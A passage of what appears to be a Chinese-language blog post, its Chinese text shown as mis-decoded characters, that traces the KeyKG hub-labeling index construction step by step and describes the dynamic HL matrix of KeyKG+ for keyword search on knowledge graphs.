Line 11 çš„æ¡ä»¶æ»¡è¶³ï¼Œè¿›å…¥æ¡ä»¶ä½“ã€‚</p><p><span class="math inline">\(L_i(u)\leftarrow L_{i-1}(u)\cup\{v_i\}\)</span> ï¼Œä½¿å¾—ç´¢å¼•å˜åŒ–ä¸ºï¼š</p><table><colgroup><col style="width: 31%" /><col style="width: 8%" /><col style="width: 8%" /><col style="width: 8%" /><col style="width: 33%" /><col style="width: 8%" /></colgroup><thead><tr class="header"><th style="text-align: center;"><span class="math inline">\(L_1(A)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(B)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(C)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(D)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(E)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(F)\)</span></th></tr></thead><tbody><tr class="odd"><td style="text-align: center;"><span class="math inline">\(A(\textrm{dist} = 0, \textrm{pred}= A)\)</span></td><td style="text-align: center;"><span class="math inline">\(\emptyset\)</span></td><td style="text-align: center;"><span class="math inline">\(\emptyset\)</span></td><td style="text-align: center;"><span class="math inline">\(\emptyset\)</span></td><td style="text-align: center;"><span class="math inline">\(A(\textrm{dist} = 0.3, \textrm{pred}= A)\)</span></td><td style="text-align: center;"><span class="math inline">\(\emptyset\)</span></td></tr></tbody></table><p>E æœªè®¿é—®çš„é‚»å±…ä¸º Bï¼Œä½†ç”±äº <span class="math inline">\(d[u]+\text{wt}((u,w)) = d[E] + \text{wt}((E,B)) = 0.3 + 0.8 = 1.1 &gt; d[B] = 0.6\)</span>ï¼Œæ‰€ä»¥ä¸æ›´æ–°ï¼›åˆç”±äº B åœ¨ PQ ä¸­ï¼Œæ‰€ä»¥ä¸åŠ å…¥ PQã€‚</p><p>æ­¤æ—¶ PQ ä¸ºï¼š</p><table><thead><tr class="header"><th style="text-align: center;">C</th><th style="text-align: center;">B</th><th style="text-align: center;">D</th><th style="text-align: center;"><code>NULL</code></th></tr></thead><tbody><tr class="odd"><td style="text-align: center;">é˜Ÿå¤´</td><td style="text-align: center;"></td><td style="text-align: center;">é˜Ÿå°¾</td><td style="text-align: center;"></td></tr></tbody></table><hr /><p>PQ å¼¹å‡º Cï¼Œç½® <span class="math inline">\(visit\)</span> ä¸º 1ï¼š</p><table><thead><tr class="header"><th style="text-align: center;"><span class="math inline">\(visited[A]\)</span></th><th style="text-align: center;"><span class="math inline">\(visited[B]\)</span></th><th style="text-align: center;"><span class="math inline">\(visited[C]\)</span></th><th style="text-align: center;"><span class="math inline">\(visited[D]\)</span></th><th style="text-align: center;"><span class="math inline">\(visited[E]\)</span></th><th style="text-align: center;"><span class="math inline">\(visited[F]\)</span></th></tr></thead><tbody><tr class="odd"><td style="text-align: center;">1</td><td style="text-align: center;">0</td><td style="text-align: center;"><strong>1</strong></td><td style="text-align: center;">0</td><td style="text-align: center;">1</td><td style="text-align: center;">0</td></tr></tbody></table><p>ç”±äº <span class="math inline">\(\textrm{d}[u] = \textrm{d}[C] = 0.4 &lt; \textrm{getD}(v_1,u) = \textrm{getD}(A,C) = \infty\)</span> ï¼Œæ•… Line 11 çš„æ¡ä»¶æ»¡è¶³ï¼Œè¿›å…¥æ¡ä»¶ä½“ã€‚</p><p><span class="math inline">\(L_i(u)\leftarrow L_{i-1}(u)\cup\{v_i\}\)</span> ï¼Œä½¿å¾—ç´¢å¼•å˜åŒ–ä¸ºï¼š</p><table><colgroup><col style="width: 25%" /><col style="width: 7%" /><col style="width: 26%" /><col style="width: 7%" /><col style="width: 26%" /><col style="width: 7%" /></colgroup><thead><tr class="header"><th style="text-align: center;"><span class="math inline">\(L_1(A)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(B)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(C)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(D)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(E)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(F)\)</span></th></tr></thead><tbody><tr class="odd"><td style="text-align: center;"><span class="math inline">\(A(\textrm{dist} = 0, \textrm{pred}= A)\)</span></td><td style="text-align: center;"><span class="math inline">\(\emptyset\)</span></td><td style="text-align: center;"><span class="math inline">\(A(\textrm{dist} = 0.4, \textrm{pred}= A)\)</span></td><td style="text-align: center;"><span class="math inline">\(\emptyset\)</span></td><td style="text-align: center;"><span class="math inline">\(A(\textrm{dist} = 0.3, \textrm{pred}= A)\)</span></td><td style="text-align: center;"><span class="math inline">\(\emptyset\)</span></td></tr></tbody></table><p>C æœªè®¿é—®çš„é‚»å±…ä¸º Fï¼Œä½†ç”±äº <span class="math inline">\(d[u]+\text{wt}((u,w)) = d[C] + \text{wt}((C,F)) = 0.4 + 2 = 2.4 &lt; d[F] = \infty\)</span>ï¼Œæ‰€ä»¥ï¼Œæ›´æ–° <span class="math inline">\(d[F]\)</span> ï¼š</p><table><thead><tr class="header"><th style="text-align: center;"><span class="math inline">\(d[A]\)</span></th><th style="text-align: center;"><span class="math inline">\(d[B]\)</span></th><th style="text-align: center;"><span class="math inline">\(d[C]\)</span></th><th style="text-align: center;"><span class="math inline">\(d[D]\)</span></th><th style="text-align: center;"><span class="math inline">\(d[E]\)</span></th><th style="text-align: center;"><span class="math inline">\(d[F]\)</span></th></tr></thead><tbody><tr class="odd"><td style="text-align: center;">0</td><td style="text-align: center;">0.6</td><td style="text-align: center;">0.4</td><td style="text-align: center;">1</td><td style="text-align: center;">0.3</td><td style="text-align: center;"><strong>2.4</strong></td></tr></tbody></table><p>æ­¤æ—¶ï¼Œå±äº <span class="math inline">\(L_1(F)\)</span> çš„ <span class="math inline">\(A(\textrm{dist} = 2.4, \textrm{pred}= C)\)</span></p><p>åˆç”±äº F ä¸åœ¨ PQ ä¸­ï¼Œæ‰€ä»¥åŠ å…¥ PQã€‚</p><p>æ­¤æ—¶ PQ ä¸ºï¼š</p><table><thead><tr class="header"><th style="text-align: center;">B</th><th style="text-align: center;">D</th><th style="text-align: center;">F</th><th style="text-align: center;"><code>NULL</code></th></tr></thead><tbody><tr class="odd"><td style="text-align: center;">é˜Ÿå¤´</td><td style="text-align: center;"></td><td style="text-align: center;">é˜Ÿå°¾</td><td style="text-align: center;"></td></tr></tbody></table><hr /><p>PQ å¼¹å‡º Bï¼Œç½® <span class="math inline">\(visit\)</span> ä¸º 1ï¼š</p><table><thead><tr class="header"><th style="text-align: center;"><span class="math inline">\(visited[A]\)</span></th><th style="text-align: center;"><span class="math inline">\(visited[B]\)</span></th><th style="text-align: center;"><span class="math inline">\(visited[C]\)</span></th><th style="text-align: center;"><span class="math inline">\(visited[D]\)</span></th><th style="text-align: center;"><span class="math inline">\(visited[E]\)</span></th><th style="text-align: center;"><span class="math inline">\(visited[F]\)</span></th></tr></thead><tbody><tr class="odd"><td style="text-align: center;">1</td><td style="text-align: center;"><strong>1</strong></td><td style="text-align: center;">1</td><td style="text-align: center;">0</td><td style="text-align: center;">1</td><td style="text-align: center;">0</td></tr></tbody></table><p>ç”±äº <span class="math inline">\(\textrm{d}[u] = \textrm{d}[B] = 0.6 &lt; \textrm{getD}(v_1,u) = \textrm{getD}(A,B) = \infty\)</span> ï¼Œæ•… Line 11 çš„æ¡ä»¶æ»¡è¶³ï¼Œè¿›å…¥æ¡ä»¶ä½“ã€‚</p><p><span class="math inline">\(L_i(u)\leftarrow L_{i-1}(u)\cup\{v_i\}\)</span> ï¼Œä½¿å¾—ç´¢å¼•å˜åŒ–ä¸ºï¼š</p><table style="width:100%;"><colgroup><col style="width: 21%" /><col style="width: 23%" /><col style="width: 22%" /><col style="width: 5%" /><col style="width: 22%" /><col style="width: 5%" /></colgroup><thead><tr class="header"><th style="text-align: center;"><span class="math inline">\(L_1(A)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(B)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(C)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(D)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(E)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(F)\)</span></th></tr></thead><tbody><tr class="odd"><td style="text-align: center;"><span class="math inline">\(A(\textrm{dist} = 0, \textrm{pred}= A)\)</span></td><td style="text-align: center;"><span class="math display">\[A(\textrm{dist} = 0.6, \textrm{pred}= A)\]</span></td><td style="text-align: center;"><span class="math inline">\(A(\textrm{dist} = 0.4, \textrm{pred}= A)\)</span></td><td style="text-align: center;"><span class="math inline">\(\emptyset\)</span></td><td style="text-align: center;"><span class="math inline">\(A(\textrm{dist} = 0.3, \textrm{pred}= A)\)</span></td><td style="text-align: center;"><span class="math inline">\(\emptyset\)</span></td></tr></tbody></table><p>B æœªè®¿é—®çš„é‚»å±…ä¸º Fï¼Œä½†ç”±äº <span class="math inline">\(d[u]+\text{wt}((u,w)) = d[B] + \text{wt}((B,F)) = 0.6 + 0.1 = 0.7 &lt; d[F] = 2.4\)</span>ï¼Œæ‰€ä»¥ï¼Œæ›´æ–° <span class="math inline">\(d[F]\)</span> ï¼š</p><table><thead><tr class="header"><th style="text-align: center;"><span class="math inline">\(d[A]\)</span></th><th style="text-align: center;"><span class="math inline">\(d[B]\)</span></th><th style="text-align: center;"><span class="math inline">\(d[C]\)</span></th><th style="text-align: center;"><span class="math inline">\(d[D]\)</span></th><th style="text-align: center;"><span class="math inline">\(d[E]\)</span></th><th style="text-align: center;"><span class="math inline">\(d[F]\)</span></th></tr></thead><tbody><tr class="odd"><td style="text-align: center;">0</td><td style="text-align: center;">0.6</td><td style="text-align: center;">0.4</td><td style="text-align: center;">1</td><td style="text-align: center;">0.3</td><td style="text-align: center;"><strong>0.7</strong></td></tr></tbody></table><p>æ­¤æ—¶ï¼Œå±äº <span class="math inline">\(L_1(F)\)</span> çš„ <span class="math inline">\(A(\textrm{dist} = 0.7, \textrm{pred}= B)\)</span></p><p>åˆç”±äº F åœ¨ PQ ä¸­ï¼Œæ‰€ä»¥ä¸åŠ å…¥ PQã€‚</p><p>æ­¤æ—¶ PQ ä¸ºï¼š</p><table><thead><tr class="header"><th style="text-align: center;">D</th><th style="text-align: center;">F</th><th style="text-align: center;"><code>NULL</code></th></tr></thead><tbody><tr class="odd"><td style="text-align: center;">é˜Ÿå¤´</td><td style="text-align: center;">é˜Ÿå°¾</td><td style="text-align: center;"></td></tr></tbody></table><hr /><p>PQ å¼¹å‡º Dï¼Œç½® <span class="math inline">\(visit\)</span> ä¸º 1ï¼š</p><table><thead><tr class="header"><th style="text-align: center;"><span class="math inline">\(visited[A]\)</span></th><th style="text-align: center;"><span class="math inline">\(visited[B]\)</span></th><th style="text-align: center;"><span class="math inline">\(visited[C]\)</span></th><th style="text-align: center;"><span class="math inline">\(visited[D]\)</span></th><th style="text-align: center;"><span class="math inline">\(visited[E]\)</span></th><th style="text-align: center;"><span class="math inline">\(visited[F]\)</span></th></tr></thead><tbody><tr class="odd"><td style="text-align: center;">1</td><td style="text-align: center;">1</td><td style="text-align: center;">1</td><td style="text-align: center;"><strong>1</strong></td><td style="text-align: center;">1</td><td style="text-align: center;">0</td></tr></tbody></table><p>ç”±äº <span class="math inline">\(\textrm{d}[u] = \textrm{d}[D] = 1 &lt; \textrm{getD}(v_1,u) = \textrm{getD}(A,D) = \infty\)</span> ï¼Œæ•… Line 11 çš„æ¡ä»¶æ»¡è¶³ï¼Œè¿›å…¥æ¡ä»¶ä½“ã€‚</p><p><span class="math inline">\(L_i(u)\leftarrow L_{i-1}(u)\cup\{v_i\}\)</span> ï¼Œä½¿å¾—ç´¢å¼•å˜åŒ–ä¸ºï¼š</p><table><colgroup><col style="width: 18%" /><col style="width: 20%" /><col style="width: 19%" /><col style="width: 18%" /><col style="width: 19%" /><col style="width: 5%" /></colgroup><thead><tr class="header"><th style="text-align: center;"><span class="math inline">\(L_1(A)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(B)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(C)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(D)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(E)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(F)\)</span></th></tr></thead><tbody><tr class="odd"><td style="text-align: center;"><span class="math inline">\(A(\textrm{dist} = 0, \textrm{pred}= A)\)</span></td><td style="text-align: center;"><span class="math display">\[A(\textrm{dist} = 0.6, \textrm{pred}= A)\]</span></td><td style="text-align: center;"><span class="math inline">\(A(\textrm{dist} = 0.4, \textrm{pred}= A)\)</span></td><td style="text-align: center;"><span class="math inline">\(A(\textrm{dist} = 1, \textrm{pred}= A)\)</span></td><td style="text-align: center;"><span class="math inline">\(A(\textrm{dist} = 0.3, \textrm{pred}= A)\)</span></td><td style="text-align: center;"><span class="math inline">\(\emptyset\)</span></td></tr></tbody></table><p>D æ²¡æœ‰æœªè®¿é—®çš„é‚»å±…ï¼Œæ•…ä¸æ›´æ–° <span class="math inline">\(d[F]\)</span> ï¼Œä¹Ÿå°±æ²¡æœ‰é¡¶ç‚¹åŠ å…¥ PQã€‚</p><p>æ­¤æ—¶ PQ ä¸ºï¼š</p><table><thead><tr class="header"><th style="text-align: center;">F</th><th style="text-align: center;"><code>NULL</code></th></tr></thead><tbody><tr class="odd"><td style="text-align: center;">é˜Ÿå¤´ï¼ˆé˜Ÿå°¾ï¼‰</td><td style="text-align: center;"></td></tr></tbody></table><hr /><p>PQ å¼¹å‡º Fï¼Œç½® <span class="math inline">\(visit\)</span> ä¸º 1ï¼š</p><table><thead><tr class="header"><th style="text-align: center;"><span class="math inline">\(visited[A]\)</span></th><th style="text-align: center;"><span class="math inline">\(visited[B]\)</span></th><th style="text-align: center;"><span class="math inline">\(visited[C]\)</span></th><th style="text-align: center;"><span class="math inline">\(visited[D]\)</span></th><th style="text-align: center;"><span class="math inline">\(visited[E]\)</span></th><th style="text-align: center;"><span class="math inline">\(visited[F]\)</span></th></tr></thead><tbody><tr class="odd"><td style="text-align: center;">1</td><td style="text-align: center;">1</td><td style="text-align: center;">1</td><td style="text-align: center;">1</td><td style="text-align: center;">1</td><td style="text-align: center;"><strong>1</strong></td></tr></tbody></table><p>ç”±äº <span class="math inline">\(\textrm{d}[u] = \textrm{d}[F] = 0.7 &lt; \textrm{getD}(v_1,u) = \textrm{getD}(A,F) = \infty\)</span> ï¼Œæ•… Line 11 çš„æ¡ä»¶æ»¡è¶³ï¼Œè¿›å…¥æ¡ä»¶ä½“ã€‚</p><p><span class="math inline">\(L_i(u)\leftarrow L_{i-1}(u)\cup\{v_i\}\)</span> ï¼Œä½¿å¾—ç´¢å¼•å˜åŒ–ä¸ºï¼š</p><table><colgroup><col style="width: 16%" /><col style="width: 17%" /><col style="width: 16%" /><col style="width: 16%" /><col style="width: 16%" /><col style="width: 16%" /></colgroup><thead><tr class="header"><th style="text-align: center;"><span class="math inline">\(L_1(A)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(B)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(C)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(D)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(E)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(F)\)</span></th></tr></thead><tbody><tr class="odd"><td style="text-align: center;"><span class="math inline">\(A(\textrm{dist} = 0, \textrm{pred}= A)\)</span></td><td style="text-align: center;"><span class="math display">\[A(\textrm{dist} = 0.6, \textrm{pred}= A)\]</span></td><td style="text-align: center;"><span class="math inline">\(A(\textrm{dist} = 0.4, \textrm{pred}= A)\)</span></td><td style="text-align: center;"><span class="math inline">\(A(\textrm{dist} = 1, \textrm{pred}= A)\)</span></td><td style="text-align: center;"><span class="math inline">\(A(\textrm{dist} = 0.3, \textrm{pred}= A)\)</span></td><td style="text-align: center;"><span class="math inline">\(A(\textrm{dist} = 0.7, \textrm{pred}= B)\)</span></td></tr></tbody></table><p>F æ²¡æœ‰æœªè®¿é—®çš„é‚»å±…ï¼Œæ•…ä¸æ›´æ–° <span class="math inline">\(d[F]\)</span> ï¼Œä¹Ÿå°±æ²¡æœ‰é¡¶ç‚¹åŠ å…¥ PQã€‚</p><p>æ­¤æ—¶ PQ ä¸ºï¼š</p><table><thead><tr class="header"><th style="text-align: center;"><code>NULL</code></th></tr></thead><tbody><tr class="odd"><td style="text-align: center;"></td></tr></tbody></table><hr /><p>è‡³æ­¤ï¼Œç¬¬ä¸€æ¬¡ for è¿­ä»£ç»“æŸï¼Œç´¢å¼•ç»“æœä¸º</p><table style="width:100%;"><colgroup><col style="width: 16%" /><col style="width: 16%" /><col style="width: 16%" /><col style="width: 16%" /><col style="width: 16%" /><col style="width: 16%" /></colgroup><thead><tr class="header"><th style="text-align: center;"><span class="math inline">\(L_1(A)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(B)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(C)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(D)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(E)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(F)\)</span></th></tr></thead><tbody><tr class="odd"><td style="text-align: center;"><span class="math inline">\(A(\textrm{dist} = 0, \textrm{pred}= A)\)</span></td><td style="text-align: center;"><span class="math inline">\(A(\textrm{dist} = 0.6, \textrm{pred}= A)\)</span></td><td style="text-align: center;"><span class="math inline">\(A(\textrm{dist} = 0.4, \textrm{pred}= A)\)</span></td><td style="text-align: center;"><span class="math inline">\(A(\textrm{dist} = 1, \textrm{pred}= A)\)</span></td><td style="text-align: center;"><span class="math inline">\(A(\textrm{dist} = 0.3, \textrm{pred}= A)\)</span></td><td style="text-align: center;"><span class="math inline">\(A(\textrm{dist} = 0.7, \textrm{pred}= B)\)</span></td></tr></tbody></table><p>ç±»ä¼¼çš„å¤„ç†ï¼Œå¯å¾—ä¸‹å›¾å³ä¸‹è§’çš„ç´¢å¼•ã€‚</p><figure><img data-src="https://gitee.com/CosmosNing/MyPicGo/raw/master/images/2020/10/example-of-KeyKG.PNG" alt="KeyKG æ‰§è¡Œçš„ä¾‹å­" /><figcaption>KeyKG æ‰§è¡Œçš„ä¾‹å­</figcaption></figure><h4 id="extension-of-index-structure">Extension of Index Structure</h4><p>ä¸ºäº†æ”¯æŒè®¡ç®— <code>getSP</code> ï¼Œæˆ‘ä»¬éœ€è¦æ‰©å±• <code>L</code> çš„ç´¢å¼•ç»“æ„ã€‚åœ¨<strong>ç®—æ³• 2</strong> ä¸­ï¼Œå¯¹äºæ¯ä¸€ä¸ª hub <span class="math inline">\(v_i\in L(w)\)</span> ï¼Œæˆ‘ä»¬ä¸ä»…ä»…å­˜å‚¨äº† <span class="math inline">\(\textrm{dist}(w,v_i)\)</span> ï¼Œè¿˜å­˜å‚¨äº†ä»¥ <span class="math inline">\(v_i\)</span> ä¸ºæ ¹èŠ‚ç‚¹æœç´¢æ ‘ä¸­ <span class="math inline">\(w\)</span> çš„å‰é©±é¡¶ç‚¹ï¼Œå¹¶å°†å…¶è®°ä½œ <span class="math inline">\(\textrm{pred}(w,v_i)\)</span> ï¼ˆLine 16ï¼‰ã€‚</p><p>æœ‰äº†æ‰©å±•åçš„ç´¢å¼•ç»“æ„ï¼Œ<code>getSP</code> å°±å¯ä»¥é€šè¿‡<strong>ç®—æ³• 3</strong> è®¡ç®—å¾—åˆ°ã€‚ä¸ºäº†å¾—åˆ°é¡¶ç‚¹ <span class="math inline">\(u,\;v\)</span> ä¹‹é—´çš„ä¸€æ¡æœ€çŸ­è·¯å¾„ <span class="math inline">\(p\)</span> ï¼Œæˆ‘ä»¬é¦–å…ˆåœ¨ <span class="math inline">\(p\)</span> ä¸Šæ‰¾åˆ°å®ƒä»¬æ‰€å…±æœ‰çš„ hub <span class="math inline">\(h_{\textrm{min}}\)</span> ï¼ˆLine 1ï¼‰ï¼Œç„¶åé‡å¤åœ°è·Ÿéšå‰é©±é¡¶ç‚¹ï¼Œæ„é€ è·¯å¾„ <span class="math inline">\(p\)</span> çš„ä» <span class="math inline">\(u\)</span> åˆ° <span class="math inline">\(h_{\textrm{min}}\)</span> çš„ä¸€æ®µï¼ˆLine 2-8ï¼‰ï¼Œä»¥åŠ <span class="math inline">\(v\)</span> åˆ° <span class="math inline">\(h_{\textrm{min}}\)</span> çš„ä¸€æ®µï¼ˆLine 9-14ï¼‰ã€‚</p><figure><img data-src="https://gitee.com/CosmosNing/MyPicGo/raw/master/images/2020/10/Algo3.PNG" alt="Algorithm 3" /><figcaption>Algorithm 3</figcaption></figure><figure><img data-src="https://gitee.com/CosmosNing/MyPicGo/raw/master/images/2020/10/example-of-KeyKG.PNG" alt="KeyKG æ‰§è¡Œçš„ä¾‹å­" /><figcaption>KeyKG æ‰§è¡Œçš„ä¾‹å­</figcaption></figure><p>ä¸¾ä¸ªä¾‹å­ï¼Œæ¯”å¦‚è®¡ç®— <code>getSP(D, F)</code> ã€‚</p><p>é¦–å…ˆï¼Œ<code>L(D)</code> å’Œ <code>L(F)</code> çš„å…¬å…± hub åªæœ‰ä¸€ä¸ªï¼Œå°±æ˜¯ <span class="math inline">\(A\)</span>ï¼Œåˆ™ <span class="math inline">\(h_{\textrm{min}} = A\)</span> ã€‚</p><p>ç„¶åï¼Œé€šè¿‡ <code>pred</code> ä¿¡æ¯æ‰¾åˆ° D-A çš„è·¯å¾„ï¼Œä¸º D-A ï¼Œå› ä¸º <code>L(D)</code> ä¸­ <span class="math inline">\(A\)</span> çš„ <code>pred</code> ä¸º <span class="math inline">\(A\)</span>ã€‚</p><p>æ¥ç€ï¼ŒåŒæ ·çš„ï¼Œæ‰¾åˆ° F-A çš„è·¯å¾„ï¼Œä¸º F-B-Aï¼Œå› ä¸º <code>L(F)</code> ä¸­çš„ A çš„ <code>pred</code> ä¸º <span class="math inline">\(B\)</span>ï¼ŒL(B) ä¸­çš„ <span class="math inline">\(A\)</span> çš„ <code>pred</code> ä¸º <span class="math inline">\(A\)</span>ã€‚</p><p>æœ€åï¼Œå°†ä¸Šé¢ä¸¤ä¸ªå­è·¯å¾„è¿èµ·æ¥ï¼Œæˆ‘ä»¬å°±æ‰¾åˆ°äº†è·¯å¾„ <span class="math inline">\(p\)</span>ï¼Œä¸º D-A-B-Fã€‚</p><h2 id="keykg-with-dynamic-hl">KeyKG+ With Dynamic HL</h2><h3 id="dynamic-hl">Dynamic HL</h3><h4 id="features">Features</h4><ul><li><strong>æŸ¥è¯¢ç›¸å…³çš„</strong>ï¼ˆ<em>query-relevant</em>ï¼‰</li><li><strong>åœ¨çº¿æ„é€ çš„</strong>ï¼ˆ<em>online constructed</em>ï¼‰</li></ul><h4 id="definition-and-structure">Definition and structure</h4><p>ä¸€ä¸ªåŠ¨æ€ HL æ˜¯ä¸€ä¸ª <span class="math inline">\((g-1)\times n\)</span> çš„çŸ©é˜µï¼Œè®°ä½œ <span class="math inline">\(M\)</span> ã€‚è¡Œå¯¹åº”äºå…³é”®è¯é¡¶ç‚¹é›† <span class="math inline">\(K_2,K_3,\dots,K_g\)</span> ï¼Œåˆ—å¯¹åº”äº hub é¡¶ç‚¹ã€‚<span class="math inline">\(M\)</span> çš„ç¬¬ <span class="math inline">\((i-1)\)</span> è¡Œï¼ˆè®°ä½œ <span class="math inline">\(M_{i-1}\)</span>ï¼‰å€’æ’å¹¶ä¸”èšé›†äº† <span class="math inline">\(K_i\)</span> ä¸­é¡¶ç‚¹çš„é™æ€ç´¢å¼•æ ‡ç­¾ã€‚<span class="math inline">\(M_{i-1}\)</span> çš„ç¬¬ j ä¸ªå…ƒç´ ï¼ˆè®°ä½œ <span class="math inline">\(M_{i-1,j}\)</span>ï¼‰æ˜¯éç©ºçš„ï¼Œå¦‚æœ <span class="math inline">\(h_j\in V\)</span> æ˜¯ä¸€ä¸ª hubï¼Œå¹¶ä¸”å®ƒåœ¨ <span class="math inline">\(K_i\)</span> çš„è‡³å°‘ä¸€ä¸ªé¡¶ç‚¹çš„é™æ€ç´¢å¼•æ ‡ç­¾ä¸­ã€‚åœ¨ <span class="math inline">\(K_i\)</span> ä¸­çš„è¿™äº›é¡¶ç‚¹ä¸­ï¼ˆè¿™äº›é¡¶ç‚¹çš„é™æ€ç´¢å¼•æ ‡ç­¾åŒ…æ‹¬ <span class="math inline">\(h_j\)</span>ï¼‰ï¼Œ<span class="math inline">\(M_{i-1, j}\)</span> ä»£è¡¨äº†æœ€å°åŒ–åˆ°è¾¾ <span class="math inline">\(h_j\)</span> çš„è·ç¦»çš„é¡¶ç‚¹ã€‚å¦‚æœï¼Œ <span class="math inline">\(h_j\)</span> ä¸æ˜¯ä¸€ä¸ªåœ¨ <span class="math inline">\(K_i\)</span> ä¸­ä»»æ„ä¸€ä¸ªé¡¶ç‚¹çš„ç´¢å¼•æ ‡ç­¾ä¸­çš„ hubï¼Œé‚£ä¹ˆæˆ‘ä»¬ä»¤ <span class="math inline">\(M_{i-1, j}\)</span> ä¸º nullï¼š <span class="math display">\[M_{i-1,j}=\begin{cases}&amp;\underset{u\in K_i\; s.t.\; h_j\in L(u)}{\textrm{argmin}}\textrm{dist}(u, h_j)&amp;h_j\in \bigcup_{u\in K_i}L(u),\\&amp;null&amp;h_j\not\in \bigcup_{u\in K_i}L(u),\end{cases}\]</span> å…·ä½“çš„ï¼Œè®ºæ–‡ä¸­ä½¿ç”¨<strong>äºŒç»´æ•°ç»„</strong>å­˜å‚¨çŸ©é˜µ <span class="math inline">\(M\)</span> ï¼Œå› æ­¤å¯ä»¥æ”¯æŒå¸¸æ•°æ—¶é—´çš„éšæœºè®¿é—®ã€‚å¯¹äºæ¯ä¸€ä¸ªä¸ä¸º null çš„ <span class="math inline">\(M_{i-1, j}\)</span> ï¼Œä¸ <span class="math inline">\(h_j\)</span> çš„è·ç¦»ä¹Ÿæ˜¯å…ˆè®¡ç®—å‡ºæ¥ï¼Œå¹¶ä¿å­˜åˆ° <span class="math inline">\(M\)</span> ä¸­ã€‚</p><h4 id="example">Example</h4><figure><img data-src="https://gitee.com/CosmosNing/MyPicGo/raw/master/images/2020/10/example-of-KeyKG.PNG" alt="KeyKG æ‰§è¡Œçš„ä¾‹å­" /><figcaption>KeyKG æ‰§è¡Œçš„ä¾‹å­</figcaption></figure><ul><li><span class="math inline">\(i = 2\)</span> æ—¶ï¼Œ<span class="math inline">\(K_2=\{E\}\)</span> ï¼Œ<span class="math inline">\(L(E) = \{A,B,E\}\)</span> ï¼Œå› æ­¤çŸ©é˜µ <span class="math inline">\(M\)</span> <span class="math inline">\(K_2\)</span> è¡Œåªæœ‰ <span class="math inline">\(A,B,E\)</span> ä¸ä¸º nullï¼Œå…¶ä»–éƒ½ä¸º nullï¼›ç”±äº <span class="math inline">\(K_2\)</span> ä¸­åªæœ‰ä¸€ä¸ªå…ƒç´  <span class="math inline">\(E\)</span> ï¼Œæ•… <span class="math inline">\(K_2\)</span> è¡Œ <span class="math inline">\(A,B,E\)</span> åˆ—ä¸­çš„å…ƒç´ éƒ½ä¸º <span class="math inline">\(E\)</span> å’Œåˆ°å®ƒçš„è·ç¦»ï¼ˆä» <span class="math inline">\(L(E)\)</span> ä¸­ç›´æ¥å–å¾—ï¼‰ã€‚</li><li><span class="math inline">\(i = 3\)</span> æ—¶ï¼Œ<span class="math inline">\(K_3=\{C,D\}\)</span> ï¼Œ<span class="math inline">\(L(C)\cup L(D) = \{A,C,D\}\)</span> ï¼Œå› æ­¤çŸ©é˜µ <span class="math inline">\(M\)</span> <span class="math inline">\(K_3\)</span> è¡Œåªæœ‰ <span class="math inline">\(A,C,D\)</span> ä¸ä¸º nullï¼Œå…¶ä»–éƒ½ä¸º nullï¼›ç”±äº <span class="math inline">\(K_3\)</span> ä¸­æœ‰ä¸¤ä¸ªå…ƒç´ ï¼Œæ•… <span class="math inline">\(K_3\)</span> è¡Œ <span class="math inline">\(A,C,D\)</span> åˆ—ä¸­çš„å…ƒç´ éœ€è¦å¯¹æ¯”ä¸€ä¸‹åˆ†åˆ«åˆ° <span class="math inline">\(C\)</span> å’Œ <span class="math inline">\(D\)</span> çš„è·ç¦»ï¼Œé€‰æ‹©è¾ƒå°çš„å­˜å…¥çŸ©é˜µ <span class="math inline">\(M\)</span> ï¼ˆæ¯”å¦‚ <span class="math inline">\(M_{K_3, A}\)</span> ï¼Œç”±äº <span class="math inline">\(\textrm{dist}(C,A) &lt; \textrm{dist}(D,A)\)</span>ï¼Œæ‰€ä»¥å°† <span class="math inline">\(C\)</span> å­˜å…¥çŸ©é˜µï¼‰ã€‚</li></ul><p>ç»¼ä¸Šæ‰€ç¤ºï¼ŒçŸ©é˜µ <span class="math inline">\(M\)</span> å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><figure><img data-src="https://gitee.com/CosmosNing/MyPicGo/raw/master/images/2020/11/matrix-M.PNG" alt="Dynamic HL Example" /><figcaption>Dynamic HL Example</figcaption></figure><h3 id="algorithm-keykg-1">Algorithm KeyKG+</h3><h4 id="algorithm-explained-1">Algorithm Explained</h4><p>KeyKG+ å¦‚<strong>ç®—æ³• 4</strong> æ‰€ç¤ºã€‚è¿™ä¸ªç®—æ³•ä¸»è¦æ„é€ äº†åŠ¨æ€ HLï¼Œå¹¶å°†å…¶ä½¿ç”¨åœ¨ä¸¤ä¸ªæ–¹é¢ï¼Œæé«˜æ‰§è¡Œçš„æ€»ä½“æ€§èƒ½ï¼Œå¹¶ä¸”å¯¹æœ€ç»ˆç»“æœæ²¡æœ‰ä»»ä½•å½±å“ã€‚</p><figure><img data-src="https://gitee.com/CosmosNing/MyPicGo/raw/master/images/2020/11/Algo4.PNG" alt="Algorithm 4" /><figcaption>Algorithm 